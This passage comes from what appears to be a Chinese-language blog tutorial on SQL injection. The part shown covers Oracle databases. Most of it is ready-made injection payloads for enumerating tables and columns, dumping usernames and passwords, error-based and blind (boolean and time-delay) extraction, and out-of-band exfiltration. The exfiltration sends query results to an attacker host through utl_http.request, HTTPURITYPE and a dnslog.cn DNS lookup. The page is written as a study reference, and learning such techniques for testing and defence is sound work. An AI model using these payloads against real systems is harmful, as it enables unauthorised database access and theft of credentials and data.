<blockquote>
<p><code>sys.v_$version</code>：Oracle 的系统视图（System View），用于展示数据库的版本信息。</p>
<p><code>banner</code>：存储版本描述字符串的字段。</p>
</blockquote>
</li>
<li><p><strong>获取库名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select &#x27;null&#x27;,(select instance_name from V$INSTANCE) from dual</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>获取表名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#第一个表名</span><br><span class="line">?id=-1 union select &#x27;null&#x27;,(select table_name from user_tables where rownum=1) from dual</span><br><span class="line">#第二个表名</span><br><span class="line">?id=-1 union select &#x27;null&#x27;,(select table_name from user_tables where rownum=1 and table_name not in &#x27;LOGMNR_SESSION_EVOLVE$&#x27;) from dual</span><br><span class="line"></span><br><span class="line">#模糊字段找表名</span><br><span class="line">?id=-1 union select &#x27;null&#x27;,(select table_name from user_tables where table_name like &#x27;%user%&#x27; and rownum=1) from dual</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>找列名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#第一列</span><br><span class="line">?id=-1 union select &#x27;null&#x27;,(select column_name from user_tab_columns where table_name=&#x27;sns_users&#x27; and rownum=1) from dual</span><br><span class="line">#第二列</span><br><span class="line">?id=-1 union select &#x27;null&#x27;,(select column_name from user_tab_columns where rownum=1 and column_name not in &#x27;USER_NAME&#x27;) from dual</span><br><span class="line"></span><br><span class="line">#模糊查询</span><br><span class="line">?id=-1 union select &#x27;null&#x27;,(select column_name from user_tab_columns where table_name=&#x27;sns_users&#x27; and rownum=1 and column_name like &#x27;%USER%&#x27;) from dual</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>找数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select USER_NAME,USER_PWD from &quot;sns_users&quot; where rownum=1</span><br></pre></td></tr></table></figure></li>
</ul>
<h5 id="报错注入-2"><a href="#报错注入-2" class="headerlink" title="报错注入"></a>报错注入</h5><p>报错注入是一种通过函数报错前进行子查询获取数据，再通过错误页面回显的一种注入手法</p>
<h6 id="ctxsys-drithsx-sn"><a href="#ctxsys-drithsx-sn" class="headerlink" title="ctxsys.drithsx.sn()"></a>ctxsys.drithsx.sn()</h6><p><code>ctxsys.drithsx.sn</code> 的第二个参数<strong>预期接受特定格式的文本索引标识符</strong>（如数字或合法名称）。</p>
<p>而当传入<strong>非预期的字符串</strong>（例如 <code>SCOTT</code>）时，函数无法正确处理，抛出错误。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=ctxsys.drithsx.sn(1,(select user from dual)) --</span><br></pre></td></tr></table></figure>

<blockquote>
<p>第二个参数类型不符号报错</p>
<p>其中<code>1=</code>让函数结果与 <code>1</code> 进行比较，从而强制执行函数并触发错误。</p>
</blockquote>
<h6 id="utl-inaddr-get-host-name"><a href="#utl-inaddr-get-host-name" class="headerlink" title="utl_inaddr.get_host_name()"></a>utl_inaddr.get_host_name()</h6><p><code>utl_inaddr.get_host_address</code> 本意是获取<strong>ip 地址</strong>，但是如果<strong>传递参数无法得到解析</strong>就会返回一个oracle 错误并显示传递的参数。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=utl_inaddr.get_host_name((select user from dual))--</span><br></pre></td></tr></table></figure>

<h6 id="XMLType"><a href="#XMLType" class="headerlink" title="XMLType()"></a>XMLType()</h6><p>Oracle 的 <code>XMLType()</code> 函数会尝试将一个字符串转换为 XML 数据类型，通过构造<code>&lt;:...&gt;</code>从而<strong>抛出 XML 解析错误</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null --</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>||</code>拼接</p>
<p><code>upper()</code> 是为了触发数据类型转换、强制处理</p>
<p><code>is not null</code> 是为了让整个表达式合法</p>
</blockquote>
<h6 id="dbms-xdb-version-checkin"><a href="#dbms-xdb-version-checkin" class="headerlink" title="dbms_xdb_version.checkin()"></a>dbms_xdb_version.checkin()</h6><p>Oracle 的 <code>DBMS_XDB_VERSION</code> 是一个内部 PL&#x2F;SQL 包，当给<code>checkin()</code>传入<strong>错误的数据类型</strong>（比如传入了一个超长字符串或格式不合规的值），就会触发异常。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and (select dbms_xdb_version.checkin((select banner from sys.v_$version where rownum=1)) from dual) is not null --</span><br></pre></td></tr></table></figure>

<h6 id="bms-xdb-version-makeversioned"><a href="#bms-xdb-version-makeversioned" class="headerlink" title="bms_xdb_version.makeversioned()"></a>bms_xdb_version.makeversioned()</h6><p><code>bms_xdb_version.makeversioned()</code>是 Oracle XML DB 的一个过程，用于对数据库对象进行“版本控制”。当传入的不是 XMLDB 所期望的对象（如不存在的表名、格式非法），就会抛出异常。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and (select dbms_xdb_version.makeversioned((select user from dual)) from dual) is not null --</span><br></pre></td></tr></table></figure>

<h6 id="dbms-utility-sqlid-to-sqlhash"><a href="#dbms-utility-sqlid-to-sqlhash" class="headerlink" title="dbms_utility.sqlid_to_sqlhash()"></a>dbms_utility.sqlid_to_sqlhash()</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and (SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual) is not null --</span><br></pre></td></tr></table></figure>

<h5 id="布尔盲注-1"><a href="#布尔盲注-1" class="headerlink" title="布尔盲注"></a>布尔盲注</h5><h6 id="decode"><a href="#decode" class="headerlink" title="decode()"></a>decode()</h6><p>decode(字段或字段的运算，值1，值2，值3）<br>当字段或字段的运算的值等于值1时，该函数返回值2，否则返回3</p>
<ul>
<li><p><strong>获取表数量</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select count(table_name) from user_tables)&gt;1--</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>获取第一个表长</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select length(table_name) from user_tables where rownum=1)&gt;8--</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>获取表的第一个ascii码的值</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and ascii(substr((select table_name from user_tables where rownum=1),0,1))&gt;82--</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>判断值</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;and 1=(select decode(substr(user,1,1),&#x27;S&#x27;,(1),0) from dual) --</span><br></pre></td></tr></table></figure>

<blockquote>
<p>如果用户名第一个字符为S则返回1，否则返回默认值</p>
</blockquote>
</li>
</ul>
<h6 id="instr"><a href="#instr" class="headerlink" title="instr()"></a>instr()</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">instr((select user from dual),&#x27;s&#x27;)</span><br></pre></td></tr></table></figure>

<p><strong>instr会返回s在用户名中的位置，未找到就返回0</strong></p>
<h5 id="时间盲注-1"><a href="#时间盲注-1" class="headerlink" title="时间盲注"></a>时间盲注</h5><h6 id="dbms-pipe-receive-message"><a href="#dbms-pipe-receive-message" class="headerlink" title="dbms_pipe.receive_message()"></a>dbms_pipe.receive_message()</h6><p>DBMS_PIPE.RECEIVE_MESSAGE()是 Oracle 的一个 PL&#x2F;SQL 包函数，用于<strong>跨会话通信</strong>，让一个会话等待另一个发送消息。这里可以通过利用管道接受消息造成时间延迟</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DBMS_PIPE.RECEIVE_MESSAGE(&#x27;pipe_name&#x27;, timeout_in_seconds);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>如果<strong>没有人向这个 pipe 发消息</strong>，这个函数就会<strong>挂起当前会话，直到超时</strong>。</p>
</blockquote>
<p>检查是否存在漏洞：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=dbms_pipe.receive_message(&#x27;o&#x27;, 10)--</span><br></pre></td></tr></table></figure>

<p>配合decode实现延迟：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=(select decode(substr(user,1,1),&#x27;S&#x27;,dbms_pipe.receive_message(&#x27;o&#x27;,5),0) from dual) --</span><br></pre></td></tr></table></figure>

<h6 id="decode-耗时操作"><a href="#decode-耗时操作" class="headerlink" title="decode()+耗时操作"></a>decode()+耗时操作</h6><p>在无法使用<code>dbms_pipe.receive_message</code>可以使用<code>(select count(*) from all_objects) </code>因为该查询结果需要一定时间：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=(select decode(substr(user,1,1),&#x27;S&#x27;,(select count(*) from all_objects),0) from dual) --</span><br></pre></td></tr></table></figure>

<h5 id="外带注入"><a href="#外带注入" class="headerlink" title="外带注入"></a>外带注入</h5><h6 id="url-http-request"><a href="#url-http-request" class="headerlink" title="url_http.request()"></a>url_http.request()</h6><p><code>UTL_HTTP.REQUEST()</code> 是 Oracle 中一个<strong>可以发出 HTTP 请求的包</strong>，通常用于集成外部 Web 服务。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and utl_http.request(&#x27;http://ip:port/&#x27;||(select banner from sys.v_$version where rownum=1))=1--</span><br><span class="line">#http访问时可以将||进行URL编码</span><br></pre></td></tr></table></figure>

<h6 id="utl-inaddr-get-host-address"><a href="#utl-inaddr-get-host-address" class="headerlink" title="utl_inaddr.get_host_address()"></a>utl_inaddr.get_host_address()</h6><p><code>utl_inaddr.get_host_address()</code>用于域名查询，他会让Oracle 数据库服务器去查询域名的 IP，相当于做一次DNS解析</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and (select utl_inaddr.get_host_address((select user from dual)||&#x27;.eeaijt.dnslog.cn&#x27;) from dual)is not null --</span><br></pre></td></tr></table></figure>

<h6 id="HTTPURITYPE"><a href="#HTTPURITYPE" class="headerlink" title="HTTPURITYPE()"></a>HTTPURITYPE()</h6><p><code>HTTPURITYPE</code> 是 Oracle 的一个类型，可以把 URL 当成对象来操作；</p>
<p><code>.GETCLOB()</code> 是它的方法之一，会尝试去<strong>访问该 URL</strong> 并获取其响应内容作为 CLOB 数据；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and (select HTTPURITYPE(&#x27;http://ip:port/&#x27;||(select user from dual)).GETCLOB() from dual)is not null --</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/carmi/p/18410869">https://www.cnblogs.com/carmi/p/18410869</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/qianggediyi/p/15611265.html#_caption5">https://www.cnblogs.com/qianggediyi/p/15611265.html#_caption5</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/404072.html">https://www.freebuf.com/articles/web/404072.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Mast1n/p/17778123.html">https://www.cnblogs.com/Mast1n/p/17778123.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.geekby.site/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/">https://www.geekby.site/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/88679754">https://blog.csdn.net/qq_36119192/article/details/88679754</a></p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1631806">https://cloud.tencent.com/developer/article/1631806</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/PANDA-Mosen/p/13283204.html">https://www.cnblogs.com/PANDA-Mosen/p/13283204.html</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/9823">https://xz.aliyun.com/news/9823</a></p>
<p><a target="_blank" rel="noopener" href="https://r0fus0d.blog.ffffffff0x.com/post/mssql-pentest/#%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B%E5%86%99webshell">https://r0fus0d.blog.ffffffff0x.com/post/mssql-pentest/#%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B%E5%86%99webshell</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/dubh3/p/15997687.html">https://www.cnblogs.com/dubh3/p/15997687.html</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://b1uel0n3.github.io">B1ueL0n3</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://b1uel0n3.github.io/2025/04/24/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E8%B6%85%E8%AF%A6%E7%BB%86/">https://b1uel0n3.github.io/2025/04/24/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E8%B6%85%E8%AF%A6%E7%BB%86/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://b1uel0n3.github.io" target="_blank">B1ueL0n3's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/SQL/">SQL</a></div><div class="post-share"><div class="social-share" data-image="/img/6.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/04/03/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/" title="Java类加载机制"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/7.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">Java类加载机制</div></div><div class="info-2"><div class="info-item-1">...</div></div></div></a><a class="pagination-related" href="/2025/05/28/URLDNS%E9%93%BE%E5%88%86%E6%9E%90/" title="URLDNS链分析"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/12.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">URLDNS链分析</div></div><div class="info-2"><div class="info-item-1">概述HashMap实现了Serializable接口，可对HashMap对象进行反序列化操作  URLDNS是ysoserial中利用链的一个名字，因为URLDNS...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/toux.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">B1ueL0n3</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">18</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">25</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#MySQL"><span class="toc-number">1.</span> <span class="toc-text">MySQL</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.</span> <span class="toc-text">环境配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89"><span class="toc-number">1.2.</span> <span class="toc-text">定义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.3.</span> <span class="toc-text">数据类型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E5%80%BC%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.3.1.</span> <span class="toc-text">数值类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A5%E6%9C%9F%E5%92%8C%E6%97%B6%E9%97%B4%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.3.2.</span> <span class="toc-text">日期和时间类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.3.3.</span> <span class="toc-text">字符串类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE%E4%B8%8E%E9%9B%86%E5%90%88%E7%B1%BB%E5%9E%8B%EF%BC%88Enumeration-and-Set-Types%EF%BC%89"><span class="toc-number">1.3.4.</span> <span class="toc-text">枚举与集合类型（Enumeration and Set Types）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%93%E6%93%8D%E4%BD%9C"><span class="toc-number">1.4.</span> <span class="toc-text">库操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A8%E6%93%8D%E4%BD%9C"><span class="toc-number">1.5.</span> <span class="toc-text">表操作</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A1%A8%E7%BA%A6%E6%9D%9F"><span class="toc-number">1.5.1.</span> <span class="toc-text">表约束</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E8%A1%A8%E7%AE%A1%E7%90%86"><span class="toc-number">1.5.2.</span> <span class="toc-text">数据表管理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A1%A8%E4%B8%AD%E6%95%B0%E6%8D%AE%E6%93%8D%E7%BA%B5"><span class="toc-number">1.5.3.</span> <span class="toc-text">表中数据操纵</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E6%9F%A5%E8%AF%A2"><span class="toc-number">1.5.4.</span> <span class="toc-text">数据查询</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="toc-number">1.5.4.1.</span> <span class="toc-text">运算符</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AF%94%E8%BE%83%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="toc-number">1.6.</span> <span class="toc-text">比较运算符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%BB%E8%BE%91%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="toc-number">1.7.</span> <span class="toc-text">逻辑运算符</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%8D%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="toc-number">2.</span> <span class="toc-text">位运算符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6"><span class="toc-number">3.</span> <span class="toc-text">通配符</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%81%9A%E5%90%88%E5%87%BD%E6%95%B0"><span class="toc-number">3.0.0.1.</span> <span class="toc-text">聚合函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%A8%A1%E7%B3%8A%E6%9F%A5%E8%AF%A2%EF%BC%88LIKE%EF%BC%89"><span class="toc-number">3.0.0.2.</span> <span class="toc-text">模糊查询（LIKE）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%86%E9%A1%B5%E6%9F%A5%E8%AF%A2%EF%BC%88LIMIT%EF%BC%89"><span class="toc-number">3.0.0.3.</span> <span class="toc-text">分页查询（LIMIT）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ORDER-BY-%E8%AF%AD%E5%8F%A5"><span class="toc-number">3.0.0.4.</span> <span class="toc-text">ORDER BY 语句</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%86%E7%BB%84%E6%9F%A5%E8%AF%A2%EF%BC%88GROUP-BY%EF%BC%89"><span class="toc-number">3.0.0.5.</span> <span class="toc-text">分组查询（GROUP BY）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%90%88%E5%B9%B6%E6%9F%A5%E8%AF%A2%E7%BB%93%E6%9E%9C%EF%BC%88UNION%EF%BC%89"><span class="toc-number">3.0.0.6.</span> <span class="toc-text">合并查询结果（UNION）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%B3%E8%81%94%E6%9F%A5%E8%AF%A2%EF%BC%88join%EF%BC%89"><span class="toc-number">3.0.0.7.</span> <span class="toc-text">关联查询（join）</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#INNER-JOIN%EF%BC%88%E5%86%85%E8%BF%9E%E6%8E%A5%EF%BC%89"><span class="toc-number">3.0.1.</span> <span class="toc-text">INNER JOIN（内连接）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LEFT-JOIN%EF%BC%88%E5%B7%A6%E8%BF%9E%E6%8E%A5%EF%BC%89"><span class="toc-number">3.0.2.</span> <span class="toc-text">LEFT JOIN（左连接）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RIGHT-JOIN%EF%BC%88%E5%8F%B3%E8%BF%9E%E6%8E%A5%EF%BC%89"><span class="toc-number">3.0.3.</span> <span class="toc-text">RIGHT JOIN（右连接）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CROSS-JOIN%EF%BC%88%E7%AC%9B%E5%8D%A1%E5%B0%94%E7%A7%AF%EF%BC%89"><span class="toc-number">3.0.4.</span> <span class="toc-text">CROSS JOIN（笛卡尔积）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AD%90%E6%9F%A5%E8%AF%A2%E4%B8%8E%E5%B5%8C%E5%A5%97%E6%9F%A5%E8%AF%A2"><span class="toc-number">3.0.4.1.</span> <span class="toc-text">子查询与嵌套查询</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">4.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%B1%E5%AE%B3"><span class="toc-number">4.2.</span> <span class="toc-text">危害</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%88%A4%E6%96%AD%E5%8F%8A%E6%B3%A8%E5%85%A5%E7%82%B9%E5%88%86%E7%B1%BB"><span class="toc-number">4.3.</span> <span class="toc-text">SQL注入判断及注入点分类</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0"><span class="toc-number">5.</span> <span class="toc-text">注入常用参数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ASCII%E7%A0%81%E8%A1%A8"><span class="toc-number">5.1.</span> <span class="toc-text">ASCII码表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BD%E6%95%B0"><span class="toc-number">5.2.</span> <span class="toc-text">函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%BA%93%E8%A1%A8"><span class="toc-number">5.3.</span> <span class="toc-text">常用库表</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF"><span class="toc-number">6.</span> <span class="toc-text">注入姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">6.1.</span> <span class="toc-text">union联合注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">6.2.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">6.2.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#updatexml-extractvalue"><span class="toc-number">6.2.2.</span> <span class="toc-text">updatexml()&#x2F;extractvalue()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-number">6.2.3.</span> <span class="toc-text">exp()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#floor"><span class="toc-number">6.2.4.</span> <span class="toc-text">floor()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#geometrycollection"><span class="toc-number">6.2.5.</span> <span class="toc-text">geometrycollection()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#multipoint"><span class="toc-number">6.2.6.</span> <span class="toc-text">multipoint()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#polygon"><span class="toc-number">6.2.7.</span> <span class="toc-text">polygon()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#multilinestring"><span class="toc-number">6.2.8.</span> <span class="toc-text">multilinestring()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#linestring"><span class="toc-number">6.2.9.</span> <span class="toc-text">linestring()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">6.3.</span> <span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">6.4.</span> <span class="toc-text">时间盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cookie%E6%B3%A8%E5%85%A5"><span class="toc-number">6.5.</span> <span class="toc-text">cookie注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">6.6.</span> <span class="toc-text">宽字节注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%82%E6%88%96%E6%B3%A8%E5%85%A5"><span class="toc-number">6.7.</span> <span class="toc-text">异或注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">6.8.</span> <span class="toc-text">堆叠注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-2"><span class="toc-number">6.8.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item 